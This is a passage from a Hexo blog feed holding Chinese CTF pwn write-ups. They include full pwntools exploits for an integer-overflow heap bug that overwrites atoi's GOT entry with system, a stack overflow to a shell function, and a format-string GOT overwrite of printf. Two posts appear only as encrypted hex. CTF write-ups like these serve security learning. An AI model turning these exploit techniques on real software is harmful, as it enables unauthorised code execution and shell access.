7659c1d1d2585c7a274697d4ca38d9a57f94beda1db98491f542680fe03912298ec96db7135f5c0a9bb68cc85a2a4080c15854cce72f7169fe0f5234e7c90c9f3b725168c09720c1a8cb83196f26881fb23b73cffc8ec478466bb7ff5b4301888d462fb84c6adfb4422346a865ca8f43619116e6e27410c6e2d9c2cc5511ed9be614d81bef75e8686e029c140fcff662849ab3b41f4cb45b4e940ed6c84a3797227aa8d151e48a</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>writeup</category>
      </categories>
  </entry>
  <entry>
    <title>3ctf复赛wp</title>
    <url>/posts/28402fba/</url>
    <content><![CDATA[<h1 id="3ctf-pwn-writeup"><a href="#3ctf-pwn-writeup" class="headerlink" title="3ctf pwn writeup"></a>3ctf pwn writeup</h1><h2 id="唯一一道pwn题"><a href="#唯一一道pwn题" class="headerlink" title="唯一一道pwn题"></a>唯一一道pwn题</h2><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114225309.png" alt></p><p>emm，打比赛的时候没看出，整数溢出，然后这里就可以堆溢出了</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>buf是一开头就申请的，0x200字节大小，所以read(0, buf, size)的时候size整数溢出的话就可以无限溢出。溢出覆盖好多个chunk，这里攻击第一个fastbin就可以了，改他的结构体指针，然后改atoi就行了</p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'/tmp/tmp.lZOfZFQz3p/92226e82'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> name,data       : io.success(name + <span class="string">": 0x%x"</span> % data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"Input your choice:"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content, encode=False)</span>:</span></span><br><span class="line">    c(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">"please input the size of secret\n"</span>, str(size))</span><br><span class="line">    sla(<span class="string">"Do you want encode(0) or decode(1) your secret ?"</span>, <span class="string">"0"</span> <span class="keyword">if</span> encode <span class="keyword">else</span> <span class="string">"1"</span>)</span><br><span class="line">    sla(<span class="string">"please input your secret:\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    c(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">":"</span>, str(idx))</span><br><span class="line">    sa(<span class="string">":\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">":"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    new(<span class="number">0x200</span>, base(<span class="string">"1"</span>*<span class="number">0x58</span>))     </span><br><span class="line">    new(<span class="number">0x200</span>, base(<span class="string">"2"</span>*<span class="number">0x58</span>))     </span><br><span class="line">    new(<span class="number">0x200</span>, base(<span class="string">"3"</span>*<span class="number">0x58</span>))</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    payload = flat([</span><br><span class="line">        <span class="string">'\x00'</span>*<span class="number">0x208</span>,</span><br><span class="line">        <span class="number">0x21</span>,</span><br><span class="line">        <span class="number">0x5b</span>,</span><br><span class="line">        elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">    ])</span><br><span class="line">    new(<span class="number">-1</span>, payload, <span class="literal">True</span>)     </span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    ru(<span class="string">"your secret is:\n"</span>)</span><br><span class="line">    libc.address = uu64(r(<span class="number">6</span>)) - libc.sym[<span class="string">'atoi'</span>]</span><br><span class="line">    lg(<span class="string">"libc_address"</span>, libc.address)</span><br><span class="line">    system = libc.sym[<span class="string">'system'</span>]</span><br><span class="line">    edit(<span class="number">0</span>, p64(system))</span><br><span class="line">    sla(<span class="string">"choice:"</span>, str(<span class="number">1</span>))</span><br><span class="line">    ru(<span class="string">" size of secret\n"</span>)</span><br><span class="line">    s(<span class="string">"sh\x00\x00"</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/28402fba/">https://noone-hub.github.io/posts/28402fba/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>二进制</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>湖湘杯练习赛</title>
    <url>/posts/c820405f/</url>
    <content><![CDATA[<h2 id="whoami"><a href="#whoami" class="headerlink" title="whoami"></a>whoami</h2><p>老题目</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">"./whoami"</span>)</span><br><span class="line"><span class="comment">#r = remote("101.71.29.5",10013)</span></span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line">shell_addr = <span class="number">0x400896</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">56</span>+p64(shell_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;927d379f30f26948d94a2285cd2d7bd7&#125;</span></span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><h2 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h2><p>也是老题目</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'183.129.189.60'</span> </span><br><span class="line">port = <span class="number">10043</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'./5c149c66064fa'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> s,addr          : io.success(<span class="string">'\033[1;31;40m%20s--&gt;0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    No canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAddr</span><span class="params">(write)</span>:</span></span><br><span class="line">    xor = <span class="number">0xff</span></span><br><span class="line">    addr = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        result = (xor &amp; write) &gt;&gt; (i * <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> result != <span class="number">0</span>:</span><br><span class="line">            addr.append(result)</span><br><span class="line">        xor = xor * <span class="number">0x100</span></span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 划分部分，按大小排序</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Partion</span><span class="params">(write, bewrite)</span>:</span></span><br><span class="line">    addr = getAddr(write)</span><br><span class="line">    part = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(addr)):</span><br><span class="line">        part.append( (addr[i], p64(bewrite+i)) )</span><br><span class="line">    part.sort(key=<span class="keyword">lambda</span> tup: tup[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> part</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得排序后的大小，升序</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sizeUp</span><span class="params">(part)</span>:</span></span><br><span class="line">    size = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(part)):</span><br><span class="line">        size.append(part[i][<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> size</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打包地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">packAddr</span><span class="params">(part)</span>:</span></span><br><span class="line">    addr =<span class="string">''</span>.join(x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> part)</span><br><span class="line">    address = <span class="string">''</span>.join(addr)</span><br><span class="line">    <span class="keyword">return</span> address</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动计算偏移</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offsetDeal</span><span class="params">(size)</span>:</span></span><br><span class="line">    length = <span class="number">12</span> * len(size)</span><br><span class="line">    <span class="keyword">if</span> length % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        offset = length / <span class="number">8</span> + <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        offset = length / <span class="number">8</span></span><br><span class="line">    length = offset * <span class="number">8</span> </span><br><span class="line">    offset += <span class="number">6</span></span><br><span class="line">    <span class="keyword">return</span> offset, length</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成payload</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payloadGenerate</span><span class="params">(size, offset)</span>:</span></span><br><span class="line">    payload = <span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(size[<span class="number">0</span>], offset)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(size)):</span><br><span class="line">        payload += <span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(size[i]-size[i<span class="number">-1</span>],offset+i)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">## 生成payload并对齐</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_payload</span><span class="params">(bewrite,  write,  offset=<span class="number">0</span>)</span>:</span></span><br><span class="line">    part = Partion(write, bewrite)</span><br><span class="line">    size = sizeUp(part)</span><br><span class="line">    address = packAddr(part)</span><br><span class="line"></span><br><span class="line">    result = offsetDeal(size)</span><br><span class="line">    <span class="keyword">if</span> offset == <span class="number">0</span>:</span><br><span class="line">        offset = result[<span class="number">0</span>]</span><br><span class="line">    length = result[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'offset is:'</span> + str(offset)</span><br><span class="line">    payload = payloadGenerate(size, offset)</span><br><span class="line">    payload = payload.ljust(length, <span class="string">'a'</span>)</span><br><span class="line">    payload += address</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">"%2$llx"</span>)</span><br><span class="line">    libc.address = int(r(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x1bc590</span></span><br><span class="line">    lg(<span class="string">"libc_addr"</span>, libc.address)</span><br><span class="line">    printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">    system_addr = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    payload = fmt_payload(printf_got, system_addr, <span class="number">17</span>)</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    gdb.attach(io,'''</span></span><br><span class="line"><span class="string">               b printf</span></span><br><span class="line"><span class="string">               c</span></span><br><span class="line"><span class="string">               ''')</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    sl(payload)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/c820405f/">https://noone-hub.github.io/posts/c820405f/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>二进制</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>湖湘杯wp</title>
    <url>/posts/64ed7ea2/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="请输入密码以阅读这篇私密文章。">
    <label for="hbePass">请输入密码以阅读这篇私密文章。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="0f0823804b46b3165a2216a119391ee0b4775514b986275d2579142aa0742144">94f0de36e665bb1d628d60821f440a048ea54ec2a28c1cf8e111c8e14c4d0a182724e27a27db101bd701b85f4a301a1aeddb86682f8a977f4a33b634c4b0a82e8d37233165bfad2d313934e1657f63dd3511e5a6de7b260c8eb44e48c11a4e8ed82b71c381721f921d77344da7539d8fe40add11d2b19623309355ac1b43ac6780189e399ece65ebeead3a53dbf6ee80b194b400f533d2482c1a686caaf80967005275a3c651e26d1a39257118f8a424f097c53f2d7fffbb3dddd6ddb60c1c5b240fc86db64b853b26ffbb3b90e5f03704594224c4131b27d7b73c0b187dd2cef027a2108ebf1b6ac6130607c44e06937c2ca9dd68fe5d95f7477ed4116a3274ffb0bf0829fdd374236714faaae40c3d98474d05ed968c33dc9960203a1fe34a212bd2ab9458224abfe7b010118c4e139227f1f95db0d5d72413076dfdf8a274a36c15fa46655a2193c7b5bfb211201c69ec8d016e470f9a22349c0a465ba049f3e3b9386860d543f99b8f13ffab2a80fd7586f5b74142ee519c81f9d883094a7b56b60328983a3174e158d330fb6ffc7afede39d9022ff56de2fb86b7374ab3ed0870a4eb358288a7e74c3499343ae3733fc6d919470d6e1a66e86c5985c1ac1f573ddabf3db53e5333608f52175742691a5c3db8190bca3ea9541835294fddc56ce12138ca46a3996671243b8063e7d3ba1bb6ee7b38fa18461a603cff7dbd7bed102296c9a802f1db74dabccdd4dbd7732639962ea35a8c5cba2c2cfc355c189ef152d3c5c5692a4a91c4bb958d2b46125e6127bf770628ffafa4f456040f5e4de1c01d7e4d389a903332288f5cd3be3db605fcc56e4fd5842648da506ce56f7822fdda4cbc226245f754bf1a38d983d3d817cd3557c3c4f34a89efdc7909bbbb2a628cda3d5bc3565ed5742d1e73784735856fc647d25585c93be928ed70e58d4aff6a0d50221f5739a2a2870e6b8eff77a162edc59007c086b11e098ac3de592b4dceac887ff828d28e11ab851d42cc950bb6de00b6fc3156aee02831e96fbfc38a92e3e99f54ac55c2f95f92cbcb4c5a58bdefa0e25435e9fce0c88ba30c3d2cbec92fc6446828990f61c1db8da5c6ba57cc25ad92103e66962e2019cc0dd6790fe7d843dc31a7f850787203d9f1ccdb0e4877dd6416f7c9726403de22831bc5e71e24d64a9e3425369d2367262129b2b9d0fe156db8a51d04c8b24197c1658e9cb90635a26d0f761c224980b67c5168a54ec540784b05afc48ffd5ee9c3f5d306507b7029700d9cca510b38ce77907c2d3392568712edcaf90273ce58641543f786cc5d5ac68cc00cceb879b313c2f50ae9429b215ca4e251ba5bfe5fa7fa3e032a11bfc2f96af5bc76f38d5ad9b4a3d1183687177f88d9b70da88731e948a46b1e8e27ade02c3a47a59a33b68abe59841a85a27d661d6199ff96d049cdc9f1d1ba00908482b68f33b05c15a51e1ee53a7773382cfbfee64003893eace1a377d269c17bdbbef93998b05a463dea64e545dd2358aeab43d76624e5fb9030e939c1e1ff4892d8e11f352f0000ee9a5f1ab1b27ab9a36858388ba548204e4d5f097b0539bc95a9ae63bb681928758b07d164b56a6f9b2278dc724c9aa6805fc7a1bb326f88fe38a2ee496f75777373223f7d4e2c6f091a4ae19c81d49a6a39893eb1ac8e86ac2875c51e0907d22c7c4b1e047a8377069b8a646c0f8ca22785403faadd450745a1ad0de77833edb9b62195ab765dfb95b72fcf150caec388d02fa1ed4422af5476500b2d2d4b48b6f037eee5197980876d5fd30d098d5651370886cdd5569af37d47dbe221ea90b09fb2f38364a6562042f79d4f2c52940a72e8d3f85b70c3b2937e892d70b6c203f4f1e88c15410aafcb8d26a0fe37343ac97e1ae8dbadb674f6bb9eb4fbe0197ade2f23af1dfd3c250c178f61c77c55081319d0b774518767fbb27c93327b9f2053e26874f4706b961ec3e43ba1f876ec5a0b5e0f533fda0ab78ba388af652209efeedbd5207412138791f1c9d740fea62452a938ce1e99c81c7b4a4ff4a8a75b4cd85f647b2e077b5c17e29a1ae4c0ea4d734d4942037404c6bbd869b31a9c6c51bbf63d53749030a0265828e5716a0f5a3c6d4016e6d9ab0a7896c3cfe59ed7de4d4c651bb27ed48e5f1a05098cadddbb15a62a4d3ef438a1cf1ce37cea44bbb5657461f84c5a2206d415575e7dc2d5b3002063e112ac41eb0be75840df639ad5b78efb9cbe2699ff42ca7e71daedc084cf9730236d64442c1f3e77ecc3f3e16f67baa3606e645500ab48b3459d8dd9b9a41778d25f66b21273a3b5d3f28a2d78603e1153de77a45a080403659afea196d715ed200d224fd9696c7596e142ffb5e00eea9ab82d59517bf945249fbc2941f5a73d57f358b770fd4ebe7185c7ad400b4f10f9060eec8978f6178073a9a171812dc344e723ed5432a92f01e240dc8fb0584d9f32f46acf7a241bb90369cbd0a6a63b0d72575cf52e4d4e18290f96b3c67bc0a8109c9ca1edbeb12692862d67e7793e8d053f904947354a98bebf49b59fd70d6c45a794a28678c08aa4b2b30544f9818dc2bdfe06b193593b644fb617063b15605face4f80356915ac6f8a6df0fe852952a2b6b473d11dd51ebb1b17c208d1859fc017fc19c5cc2ac9099142b975fc3cf983971eecd6ec3968215f561ce1082fa5ce21f798d98fa6c3822b863db5dc2758b410c854086a42be26f75c591507c1d02d3052db97c0e138d9aac29d655628c86f1f574f1fd5899f6bdbb2d9f3635a7fdc1f778873aac021cf57e93eb41c7933e6194c48507ff47057a99f845599c8969d617e4a5948773159066ffa861346bba7a6e782bac607f8d97c32ec50c30cb3ea3cd5a8a25e3ec96b58ce4ab1a164d191f147fdc0ef18fa3133b5a09a51d05965f026a60d160ef5d2dc6032beb7e119c2b5e1e1908f3f3a528ae9bc4de54d96e41297b36f223d0d278a909a5fdc8ab847b8f8c852fd0d02601a5fea8d8cdea474207e2109fd6bc206deeff23e0f921c2e7e1e70efc40f50e0e7d8b5782c4810c3cd4c6ba4dfb46e880a139d8f4cdd676db4e4c82cf691f704f7121dde50c3bfb09d7d430597c8cef4d4db79dda0b98d9431ffd2f5a8f0332e1486bef75a5943c8e8b193f4060d858197795c9118299ea040d971ec274a053299ec664fda49894b1b610bfd9e563c0e4dbe6b2c335d2c7509793c7a8b8a8f7fac4c4d50c61ec298504898734c4c21e5a02fd562589e9409baf776a6439ee4142c16fabf0070ff0394d4351a16c86f3c721c563722ef0e0d3daeb15247db722f90b9001485cf7bfa2197f9f7f6b83c2ba98612f911e8c91071b6d3d987b6ad8fa0dc4629c9a4c163771b6f77c353da37cf3fca38876d9aa289cbf4a4fc7aad61dac47631a0b1cee7138d9f342f598f39d23347983e4986bbb292bb43ea7b31769f6c319736e9d59fe72025da0762b75e0b8b877a65c04e7641e73588f3f08c529661d4701e1c413b52f96e27558da17715ff61a12751e08df358b3d46df0f723ef0440d8a634835c496c67c61a0ad90087e885e0ba353967f55a9bce9bd69b0ee10814d160412611641e93224df3379bd3c923fe60175ae8f40cdb54f8b0f77bb547961f3b2ec13650029bc1654c8796e469a6b8421b0d0459d38c51662d7c11bfc1911bbea63f4cafd5e9d1566e65630dfa9c9f131df145682df715b34e00bb2e0d8eb1dfaead0e17ba9f93f135e7802a191e0e68dab9383ae338aa0c4710535443f6ea1bd633cb5473142021abaee6ea0a60929cbdcb2c273f49d1668f4bf38cf04e0be65720dc273815a4ae81816cfdf273b6bd07d327d61f2ddb2d44e7188e180f9b49057049c063669ba280ea85d0a6715cc13f798548c5174fa25bd22985008d3159956800cf9e54b1c08103f18cd01a9a675192c453af7d1a67319c142c9c160b4d7ab644fed905179793057a210365b7225e0cf154c1e5383272e8d4743ebb3457f3bebcf61517f670d3d9e76cf0846764c9f1370fb1a7697e02d181db8de0f1b772ff9b33689f98383092840c42d5b91c6878012ea090103d8cbce03358f27d542b021c4bc547376e558deac2085bb2bd97265e951157059757cfccf1ef01974d37880f0d5c12c40a352fae9211d263aad8c7efd1ba73e23f212c054424465b68e6b430e3648e6aed89b3eef153ece3c5ebb0687a45bf1806fdd904c22ce142be43f460ed5a3e287dfb8b95ff1c3c453ea224f2744246db316ccd09da04b4a26180a1feb35a7fc8ba83ad2bbadb6dab49491675166832abf72d00fcbdde58df81e829278c7d28aa98d1e1521d5b2fb9d785f3367931c3ebdef0880dc4ac827e36ba4470365df35cf189208f73da0fbaa67703f6f9ba9b86659a740bd528b6dcd9b8c259baeecce1d44cf86d4d246266dfc21a9d386f87c9b614201e4677e7bbf4637dd83d806a0c19afe97daa8eb29a0c1de2260bca453792dfe63de8e4da54850ee7f2b82924213abef4fcca7a8a059826e6b461a23c4d172357869a8e087083b9b83fe076b05885cc45de0c80d1207bc454c68e0325c82021a71c200dbac3e674b92e7779d5f80e7de4d936a40fb94075b61bd798d8490d269832c702868495914eea97e8d25100ce5398eab368f827d5d7f328e461b665a0776bd8babd26f9bc8cfaa9bb902411d1e0856c607c7e6359108e0a2aed49904212c6602911986df853f757605f4475e040639695714a7664f65949b5f44edd7ce96597bc43e7345086d1f20d67d72dec0b6a185bd54c15684c7facb85889967a5a7e3ebcaf104a4a3380d06fb701a1362bd4669f2deccc00e4ed7ba5c07e8027dc2ac82f055858973b4e8233bc57ec163a0148a8b12757d7bfe5248e05467c2f25672a855313da686729dadb3b5909e8f0e51082e3c869308b65bfdf7276b4ff41b2029e079c80bb4db8c583b22a0bd38ca384c61b453fa714260c71d7e96a399c6621ffd853c31c4e62b203bbac4f2a81c0ca02678337a57d478801fdc2677330f9e2d41a355bbef9aded72c99e44d184d34de376448ea5057dd7eadfda58759b27eb8e694fb6ef42c8bcfcc4b9605bf02a6e99b59a8dfe906aa89ef604c45174ce1e440645703b1ac7ae9baa67b49949fa0cbd3c106945691b9efc34247c86c9d0868b7c0ed10b5fb67f19b29b9e514b012b3fad8c524b0b81d7fc246c4d56df249a1e2121137beb7febe0f15e18894de79e104d64de8186b1c5de9fdac1b7ff21a69ce3cfd5f790a519db3359428ee004c4447ca7e7bb85f7c67d279a105dc28838061ddda793b4abeeb31d4b4370fbdf0788d4d17c9655d248b66527817adb888f591ceba8b36705a0ac79d0a61d9a5adfdb60d8211580ba6c3477e17dc64adc8e7b6128f4728cf56b0c5193e7317130e5eba09fb6bfdbe0390d133ebf28b6a3809ff4e10e58a10c00df1476d1f718181ff7f60c00f942ba27da54148a036ce58111fc3ad971c1507ada782a72146b8a7965234eae07f62fb42e2c7880bc4bf91709196fc172c4d692e0382f2a055254c7cdb9958eb7dc1d37d3b04ba480a55c3f7c3b91db86b4fb0b95cecf5a47289867156c13557bb851df85519c80197a84472b03811dffdf1963d75cc313177b270e6e0d3e57ae35dfa35090de3ff753f86bf660448bd840274d7aae75eb4deae759f